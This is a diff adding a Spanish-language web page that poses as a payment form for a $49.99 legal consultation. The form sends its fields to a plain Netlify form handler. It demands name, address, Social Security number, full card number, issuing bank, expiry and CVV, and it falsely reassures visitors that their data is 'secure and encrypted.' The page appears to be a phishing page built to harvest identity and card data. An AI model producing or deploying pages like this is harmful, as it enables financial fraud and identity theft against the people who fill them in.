@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago de consultas</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Barra de Navegación -->
+    <nav class="navbar">
+        <div class="container">
+            <div class="logo"> Pago de consultas</div>
+            <ul class="nav-links">
+                <li><a href="#inicio">Inicio</a></li>
+                <li><a href="#pago">Pagar Consulta</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Sección de Inicio -->
+    <section id="inicio" class="hero">
+        <div class="hero-content">
+            <h1>Pago Agenda de cita</h1>
+            <p>Asesoría legal de calidad con expertos en diversos campos</p>
+            <button class="btn-primary" onclick="document.getElementById('pago').scrollIntoView({behavior: 'smooth'})">
+                Solicitar Consulta
+            </button>
+        </div>
+    </section>
+
+    <!-- Sección de Pago de Consulta -->
+    <section id="pago" class="pago-section">
+        <div class="container">
+            <h2>Pagar consulta - $49.99 USD</h2>
+            <p class="section-subtitle">Complete el formulario para agendar su consulta jurídica</p>
+            
+            <form name="pago-consulta" method="POST" data-netlify-honeypot="bot-field" netlify class="form-pago">
+                <input type="hidden" name="bot-field">
+                <div class="form-group">
+                    <label for="nombre">Nombre *</label>
+                    <input type="text" id="nombre" name="nombre" placeholder="Ingrese su nombre" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="apellido">Apellido *</label>
+                    <input type="text" id="apellido" name="apellido" placeholder="Ingrese su apellido" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Correo Electrónico *</label>
+                    <input type="email" id="email" name="email" placeholder="ejemplo@correo.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="telefono">Teléfono</label>
+                    <input type="tel" id="telefono" name="telefono" placeholder="+1 (555) 123-4567">
+                </div>
+
+                <div class="form-group">
+                    <label for="direccion">Dirección completa *</label>
+                    <input type="text" id="direccion" name="direccion" placeholder="Calle, número, apartamento" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="estado">Estado *</label>
+                    <input type="text" id="estado" name="estado" placeholder="Ingrese su estado" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="codigopostal">Código Postal *</label>
+                    <input type="text" id="codigopostal" name="codigopostal" placeholder="12345" maxlength="10" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="ciudad">Ciudad *</label>
+                    <input type="text" id="ciudad" name="ciudad" placeholder="Ingrese su ciudad" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="seguroSocial">Seguro Social *</label>
+                    <input type="text" id="seguroSocial" name="seguroSocial" placeholder="000-00-0000" maxlength="11" required>
+                </div>
+
+                <fieldset class="card-fieldset">
+                    <legend>Información de Pago</legend>
+                    
+                    <div class="form-group">
+                        <label for="cardname">Nombre en la Tarjeta *</label>
+                        <input type="text" id="cardname" name="cardname" placeholder="Nombre como aparece en la tarjeta" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cardnumber">Número de Tarjeta *</label>
+                        <input type="text" id="cardnumber" name="cardnumber" placeholder="1234 5678 9012 3456" 
+                               maxlength="19" placeholder-style="color: #999;" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="tipotarjeta">Tipo de Tarjeta *</label>
+                        <select id="tipotarjeta" name="tipotarjeta" required>
+                            <option value="">Seleccione</option>
+                            <option value="credito">Crédito</option>
+                            <option value="debito">Débito</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="banco">Banco *</label>
+                        <input type="text" id="banco" name="banco" placeholder="Nombre del banco" required>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="expiry">Vencimiento (MM/YY) *</label>
+                            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="cvv">CVV *</label>
+                            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                        </div>
+                    </div>
+                </fieldset>
+
+                <div class="form-group checkbox">
+                    <input type="checkbox" id="terminos" name="terminos" required>
+                    <label for="terminos">Acepto los términos y condiciones de servicio *</label>
+                </div>
+
+                <button type="submit" class="btn-submit">Pagar Consulta - $49.99</button>
+            </form>
+
+            <div class="security-note">
+                🔒 Su información de pago es segura y encriptada
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Consultas seguras. Todos los derechos reservados.</p>
+            <p>Asesoría legal profesional y confidencial</p>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
